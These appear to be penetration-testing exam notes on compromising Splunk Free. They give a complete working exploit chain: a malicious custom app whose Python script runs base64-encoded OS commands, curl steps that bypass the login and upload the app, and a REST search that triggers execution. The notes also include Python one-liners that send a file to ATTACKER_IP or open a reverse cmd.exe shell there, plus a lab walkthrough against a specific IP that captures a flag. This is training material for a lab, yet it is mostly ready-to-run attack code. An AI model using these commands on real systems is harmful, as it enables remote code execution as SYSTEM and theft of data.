# Section 14 — Attacking Splunk

Primary attack path: upload a malicious custom Splunk app → app installs a Python script → trigger via `| script` search command → OS command execution.

Splunk runs as **SYSTEM** (Windows) or **root** (Linux) by default.

---

## Attack Flow (Free Mode — No Auth)

```
1. Login to web UI (HTTPS:8000) → get session cookies + CSRF token
2. Fetch upload page → extract state token
3. POST multipart to /en-US/manager/appinstall/_upload (with state + CSRF + app file)
4. Trigger via REST API: POST /services/search/jobs with | script msf_exec <base64_cmd>
```

**Note:** Splunk web UI is HTTPS (not HTTP) on port 8000. REST API is HTTPS on port 8089.

---

## App Structure Required

Splunk app = directory (named after app) with:
```
upload_app_exec/
├── bin/
│   └── msf_exec.py          # Python script executed by Splunk
├── default/
│   ├── app.conf             # required metadata
│   └── commands.conf        # registers the 'script' command
└── metadata/
    └── default.meta
```

**commands.conf** (registers the custom script command):
```ini
[msf_exec]
type = python
filename = msf_exec.py
local = false
enableheader = false
streaming = false
perf_warn_limit = 0
```

**msf_exec.py** (Python 3 — fixes the MSF module's Python 2 bytes bug):
```python
import sys
import base64
import splunk.Intersplunk

results = []
try:
    sys.modules['os'].system(base64.b64decode(sys.argv[1]).decode())
except:
    import traceback
    stack = traceback.format_exc()
    results = splunk.Intersplunk.generateErrorResults("Error : " + str(stack))
splunk.Intersplunk.outputResults(results)
```

**app.conf**:
```ini
[launcher]
author=Marc Wickenden
description=Metasploit module spunk_upload_app_exec.rb
version=1.3.3.7

[ui]
is_visible = true
```

Package: `cd /tmp/app_build && tar czf upload_app_exec.tgz upload_app_exec/`

---

## Full Attack (curl-based, HTTPS)

### Step 1 — Get session + CSRF token

```bash
# Get cval cookie from login page
curl -sk -c /tmp/sc.txt \
  "https://TARGET:8000/en-US/account/login?return_to=%2Fen-US%2Fmanager%2Fappinstall%2F_upload" \
  -o /dev/null

CVAL=$(grep cval /tmp/sc.txt | awk '{print $NF}')

# POST login (Free mode: no credentials needed — just submit the cval)
curl -sk -c /tmp/sc.txt -b /tmp/sc.txt \
  "https://TARGET:8000/en-US/account/login" \
  -X POST \
  -d "cval=$CVAL&username=admin&password=&return_to=%2Fen-US%2Fmanager%2Fappinstall%2F_upload" \
  -o /dev/null

CSRF=$(grep "splunkweb_csrf_token_8000" /tmp/sc.txt | awk '{print $NF}')
echo "CSRF: $CSRF"
```

### Step 2 — Get state token from upload page

```bash
STATE=$(curl -sk -c /tmp/sc.txt -b /tmp/sc.txt \
  "https://TARGET:8000/en-US/manager/appinstall/_upload" \
  | grep -oP 'name="state" value="\K[^"]+')
echo "STATE: $STATE"
```

### Step 3 — Upload app

```bash
curl -sk -c /tmp/sc.txt -b /tmp/sc.txt \
  -X POST \
  -H "X-Splunk-Form-Key: $CSRF" \
  -H "X-Requested-With: XMLHttpRequest" \
  -F "state=$STATE" \
  -F "splunk_form_key=$CSRF" \
  -F "appfile=@/path/to/upload_app_exec.tgz;type=application/x-compressed-tar" \
  -F "force=1" \
  "https://TARGET:8000/en-US/manager/appinstall/_upload" \
  -w "\nHTTP: %{http_code}\n"
# HTTP: 303 = success
```

### Step 4 — Trigger RCE via REST API search

```bash
nc -lvnp 4444 > /tmp/output.txt &

# Encode command
CMD='python -c "import socket; s=socket.socket(); s.connect((\"ATTACKER_IP\",4444)); s.send(open(\"c:/loot/flag.txt\",\"rb\").read()); s.close()"'
CMD_B64=$(echo -n "$CMD" | base64 -w 0)

# Fire search job — REST API has no auth in Free mode
curl -sk -X POST \
  "https://TARGET:8089/services/search/jobs" \
  --data-urlencode "search=search * | script msf_exec $CMD_B64" \
  -d "output_mode=json&namespace=upload_app_exec"

sleep 8 && cat /tmp/output.txt
```

---

## Why upload_app_exec.tgz from MSF fails on modern Splunk

The MSF module's bundled `msf_exec.py` uses:
```python
sys.modules['os'].system(base64.b64decode(sys.argv[1]))   # Python 2 only
```

Splunk 8.x uses Python 3 where `b64decode()` returns `bytes`, not `str`. Fix:
```python
sys.modules['os'].system(base64.b64decode(sys.argv[1]).decode())  # Python 3
```

The MSF module `exploit/multi/http/splunk_upload_app_exec` also fails on Kali due to a Ruby HTTP constant bug — use the curl-based method above instead.

---

## Reverse Shell Alternative

Instead of exfiltrating a file, get a full shell:
```bash
CMD='python -c "import socket,subprocess; s=socket.socket(); s.connect((\"ATTACKER_IP\",4444)); subprocess.call([\"cmd.exe\"],stdin=s,stdout=s,stderr=s)"'
```

Or use `cmd.exe /c` for Windows commands:
```bash
CMD='cmd.exe /c type c:\\loot\\flag.txt > \\\\ATTACKER_IP\\share\\flag.txt'
```

---

## Exam Notes

- Splunk web = **HTTPS** on 8000 (not HTTP) — curl without `-sk` will fail
- REST API (8089) has no auth in Free mode — search jobs work without login
- App upload requires: state token + CSRF cookie value + session cookie
- CSRF cookie = `splunkweb_csrf_token_8000` value = also used as `splunk_form_key` form field
- State token changes each page load — fetch fresh before each upload attempt
- `force=1` in form data overwrites existing apps of the same name
- After upload, Splunk loads the app without restart — no wait needed
- MSF module path: `exploit/multi/http/splunk_upload_app_exec` (broken on Kali Ruby, use curl)
- Splunk runs as SYSTEM on Windows — no privesc needed

---

## Lab Walkthrough (`10.129.201.50`)

**Target:** Splunk 8.2.2 Free, Windows, HTTPS on 8000

```bash
TARGET=10.129.201.50

# 1. Login flow
curl -sk -c /tmp/sc.txt \
  "https://$TARGET:8000/en-US/account/login?return_to=%2Fen-US%2Fmanager%2Fappinstall%2F_upload" \
  -o /dev/null
CVAL=$(grep cval /tmp/sc.txt | awk '{print $NF}')
curl -sk -c /tmp/sc.txt -b /tmp/sc.txt \
  "https://$TARGET:8000/en-US/account/login" \
  -X POST \
  -d "cval=$CVAL&username=admin&password=&return_to=%2Fen-US%2Fmanager%2Fappinstall%2F_upload" \
  -o /dev/null
CSRF=$(grep "splunkweb_csrf_token_8000" /tmp/sc.txt | awk '{print $NF}')

# 2. Get state token
STATE=$(curl -sk -c /tmp/sc.txt -b /tmp/sc.txt \
  "https://$TARGET:8000/en-US/manager/appinstall/_upload" \
  | grep -oP 'name="state" value="\K[^"]+')

# 3. Upload fixed app
curl -sk -c /tmp/sc.txt -b /tmp/sc.txt \
  -X POST \
  -H "X-Splunk-Form-Key: $CSRF" \
  -H "X-Requested-With: XMLHttpRequest" \
  -F "state=$STATE" \
  -F "splunk_form_key=$CSRF" \
  -F "appfile=@/tmp/upload_app_exec_py3_fixed.tgz;type=application/x-compressed-tar" \
  -F "force=1" \
  "https://$TARGET:8000/en-US/manager/appinstall/_upload" \
  -w "\nHTTP: %{http_code}\n"

# 4. Start listener
nc -lvnp 4444 > /tmp/flag.txt &

# 5. Trigger RCE
CMD='python -c "import socket; s=socket.socket(); s.connect((\"10.10.17.176\",4444)); s.send(open(\"c:/loot/flag.txt\",\"rb\").read()); s.close()"'
CMD_B64=$(echo -n "$CMD" | base64 -w 0)
curl -sk -X POST \
  "https://$TARGET:8089/services/search/jobs" \
  --data-urlencode "search=search * | script msf_exec $CMD_B64" \
  -d "output_mode=json&namespace=upload_app_exec"

sleep 8 && cat /tmp/flag.txt
```

**Flag:** `l00k_ma_no_AutH!`  
**Flag location:** `c:\loot\flag.txt`  
**Running as:** SYSTEM
